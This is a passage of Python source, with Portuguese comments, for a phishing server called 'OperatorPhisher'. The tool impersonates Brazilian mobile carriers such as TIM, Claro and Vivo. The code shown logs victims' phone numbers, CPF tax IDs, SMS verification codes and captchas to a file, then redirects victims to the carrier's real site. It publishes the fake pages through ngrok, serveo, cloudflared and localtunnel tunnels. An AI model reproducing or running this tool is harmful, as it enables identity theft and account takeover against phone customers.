        data = f"[{timestamp}] [{ip_address}] [{operator}] DDI: {ddi} | Telefone: {phone_number} | CPF: {cpf}"
        if code:
            data += f" | Código: {code}"
        if captcha:
            data += f" | Captcha: {captcha}"
        data += "\n"
        
        # Salvar em arquivo
        with open(DATA_FILE, "a", encoding="utf-8") as f:
            f.write(data)
            
        # Log no console
        print(f"{Colors.GREEN}[+] {Colors.RESET}Dados capturados - {operator}: {ddi} {phone_number}")
        print(f"{Colors.GREEN}[+] {Colors.RESET}CPF: {cpf}")
        if code:
            print(f"{Colors.CYAN}[+] {Colors.RESET}Código: {code}")
        if captcha:
            print(f"{Colors.CYAN}[+] {Colors.RESET}Captcha: {captcha}")
        
    def get_redirect_url(self, operator):
        # URLs oficiais de redirecionamento para cada operadora
        redirect_urls = {
            "tim": "https://tim.com.br/",
            "claro": "https://claro.com.br/",
            "vivo": "https://vivo.com.br/",
            "oi": "https://oi.com.br/",
            "nextel": "https://nextel.com.br/",
            "algar": "https://algartelecom.com.br/",
            "unknown": "https://anatel.gov.br/"
        }
        
        return redirect_urls.get(operator, redirect_urls["unknown"])
        
    def log_message(self, format, *args):
        # Personalizar logs
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = format % args
        log_entry = f"[{timestamp}] {message}\n"
        
        # Salvar log em arquivo
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry)
            
        # Exibir log colorido no console
        if "200" in message:
            color = Colors.GREEN
        elif "302" in message:
            color = Colors.CYAN
        elif "404" in message:
            color = Colors.RED
        else:
            color = Colors.YELLOW
            
        print(f"{color}[{timestamp}] {message}{Colors.RESET}")

class OperatorPhisher:
    def __init__(self, port=PORT):
        self.host = HOST
        self.port = port
        self.httpd = None
        self.tunnel_urls = {}
        
    def start_server(self):
        try:
            with socketserver.TCPServer((self.host, self.port), PhishingHandler) as httpd:
                self.httpd = httpd
                print(f"{Colors.GREEN}[+] {Colors.RESET}Servidor iniciado em http://{self.host}:{self.port}")
                print(f"{Colors.GREEN}[+] {Colors.RESET}Páginas disponíveis:")
                
                for operator, config in OPERATOR_TEMPLATES.items():
                    print(f"{Colors.BLUE}    http://{self.host}:{self.port}{config['path']} {Colors.RESET}- {config['operator_name']}")
                
                print(f"\n{Colors.YELLOW}[!] {Colors.RESET}Pressione Ctrl+C para parar o servidor")
                
                # Iniciar tunnels em threads separadas
                self.start_tunnels()
                
                try:
                    httpd.serve_forever()
                except KeyboardInterrupt:
                    print(f"\n{Colors.RED}[-] {Colors.RESET}Parando servidor...")
                    
        except Exception as e:
            print(f"{Colors.RED}[-] {Colors.RESET}Erro ao iniciar servidor: {e}")
            
    def start_tunnels(self):
        """Inicia tunnels em threads separadas"""
        tunnel_threads = []
        
        for service in TUNNEL_SERVICES:
            thread = threading.Thread(target=self.setup_tunnel, args=(service,))
            thread.daemon = True
            thread.start()
            tunnel_threads.append(thread)
            
        # Dar tempo para os tunnels iniciarem
        time.sleep(3)
        
    def setup_tunnel(self, service):
        """Configura um tunnel específico"""
        if service == "localhost":
            return  # Já estamos rodando localmente
            
        elif service == "serveo":
            try:
                print(f"{Colors.BLUE}[*] {Colors.RESET}Iniciando tunnel Serveo...")
                subprocess.run(["ssh", "-R", "80:localhost:" + str(self.port), "serveo.net"], 
                              capture_output=True, timeout=5)
            except:
                print(f"{Colors.RED}[-] {Colors.RESET}Serveo não disponível")
                
        elif service == "ngrok":
            try:
                print(f"{Colors.BLUE}[*] {Colors.RESET}Iniciando tunnel Ngrok...")
                # Verificar se ngrok está instalado
                result = subprocess.run(["ngrok", "http", str(self.port)], capture_output=True, timeout=10)
                if result.returncode == 0:
                    # Tentar obter a URL do ngrok
                    try:
                        response = requests.get("http://localhost:4040/api/tunnels", timeout=5)
                        data = response.json()
                        ngrok_url = data['tunnels'][0]['public_url']
                        self.tunnel_urls['ngrok'] = ngrok_url
                        print(f"{Colors.GREEN}[+] {Colors.RESET}Ngrok: {ngrok_url}")
                    except:
                        print(f"{Colors.YELLOW}[!] {Colors.RESET}Ngrok iniciado mas não foi possível obter URL")
            except:
                print(f"{Colors.RED}[-] {Colors.RESET}Ngrok não disponível")
                
        elif service == "cloudflared":
            try:
                print(f"{Colors.BLUE}[*] {Colors.RESET}Iniciando tunnel Cloudflared...")
                result = subprocess.run(["cloudflared", "tunnel", "--url", "http://localhost:" + str(self.port)], 
                                       capture_output=True, timeout=10)
                if result.returncode == 0:
                    print(f"{Colors.GREEN}[+] {Colors.RESET}Cloudflared tunnel iniciado")
            except:
                print(f"{Colors.RED}[-] {Colors.RESET}Cloudflared não disponível")
                
        elif service == "localtunnel":
            try:
                print(f"{Colors.BLUE}[*] {Colors.RESET}Iniciando LocalTunnel...")
                result = subprocess.run(["lt", "--port", str(self.port)], capture_output=True, timeout=10)
                if result.returncode == 0:
                    # Extrair URL da saída
                    output = result.stdout.decode()
                    for line in output.split('\n'):
                        if 'your url is:' in line.lower():
                            url = line.split(':', 1)[1].strip()
                            self.tunnel_urls['localtunnel'] = url
                            print(f"{Colors.GREEN}[+] {Colors.RESET}LocalTunnel: {url}")
                            break
            except:
                print(f"{Colors.RED}[-] {Colors.RESET}LocalTunnel não disponível")
            
    def get_local_ip(self):
        try:
            # Obter IP local
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
            
    def get_public_ip(self):
        try:
            # Tentar obter IP público
            import requests
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text
        except:
            return "Não disponível"

def print_banner():
    print(f"""{Colors.PURPLE}
     ██████╗ ██████╗ ███████╗██████╗  █████╗ ██████╗  ██████╗ ██████╗  █████╗ 
    ██╔═══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔══██╗
    ██║   ██║██████╔╝█████╗  ██████╔╝███████║██████╔╝██║   ██║██████╔╝███████║
    ██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗██╔══██║██╔══██╗██║   ██║██╔══██╗██╔══██║
    ╚██████╔║██║     ███████╗██║  ██║██║  ██║██║  ██║╚██████╔╝██║  ██║██║  ██║
     ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
    {Colors.RESET}""")
    
    print(f"{Colors.CYAN}    ideia de > nathanael lucas{Colors.RESET}\n")

def main():
    # Verificar argumentos
    port = PORT
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except ValueError:
            print(f"{Colors.RED}[-] {Colors.RESET}Porta inválida. Usando porta padrão {PORT}")
            port = PORT
    
    print_banner()
    
    # Verificar se é root (para portas baixas)
    if os.geteuid() == 0 and port < 1024:
        print(f"{Colors.YELLOW}[!] {Colors.RESET}Executando como root para usar porta {port}")
    else:
        if port < 1024 and os.geteuid() != 0:
            print(f"{Colors.RED}[-] {Colors.RESET}Portas abaixo de 1024 requerem privilégios de root")
            sys.exit(1)
    
    # Mostrar informações de rede
    phisher = OperatorPhisher(port)
    local_ip = phisher.get_local_ip()
    public_ip = phisher.get_public_ip()
    
    print(f"{Colors.BLUE}[*] {Colors.RESET}IP Local: {local_ip}")
    print(f"{Colors.BLUE}[*] {Colors.RESET}IP Público: {public_ip}")
    print(f"{Colors.BLUE}[*] {Colors.RESET}Porta: {port}")
    print(f"{Colors.BLUE}[*] {Colors.RESET}Arquivo de dados: {DATA_FILE}")
    print(f"{Colors.BLUE}[*] {Colors.RESET}Serviços de tunnel: {', '.join(TUNNEL_SERVICES)}\n")
    
    # Iniciar servidor
    phisher.start_server()

if __name__ == "__main__":
    main()
